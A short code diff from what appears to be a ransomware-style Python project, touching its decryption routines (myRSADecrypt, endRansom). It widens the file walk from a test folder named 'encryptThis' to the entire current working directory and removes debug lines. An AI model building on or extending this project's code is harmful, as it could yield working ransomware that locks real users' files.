@@ -123,7 +123,7 @@ def myRSADecrypt (RSACipher, file_path, iv, tag, ext, RSA_Privatekey_filepath):
 	hmac_key = ""
 	enc_key = ""
 	key = ""
-	print(file_path)
+
 	if(os.path.isfile(RSA_Privatekey_filepath)):
 		with open(RSA_Privatekey_filepath, "rb") as key_file:
 			private_key = serialization.load_pem_private_key(
@@ -157,7 +157,7 @@ def endRansom():
 	keyFolder = os.path.join(os.getcwd(),"keys")
 	privateKeyPath = os.path.join(keyFolder, "private_key")
 
-	for dirName, subDirList, fileList in os.walk('encryptThis'):
+	for dirName, subDirList, fileList in os.walk(os.getcwd()):
 		print('Found directory: %s' % dirName)
 		for fileName in fileList:
 			print(fileName)
@@ -168,7 +168,6 @@ def endRansom():
 					try:
 						data = json.load(json_file)				
 						RSACipher =  data['RSACipher'].encode('latin-1')
-						#cipherFile = data['cipherFile'].encode('latin-1')
 						iv = 		 data['iv'].encode('latin-1')
 						tag = 		 data['tag'].encode('latin-1')
 						fileExt = 	 data['fileExt'].encode('latin-1')
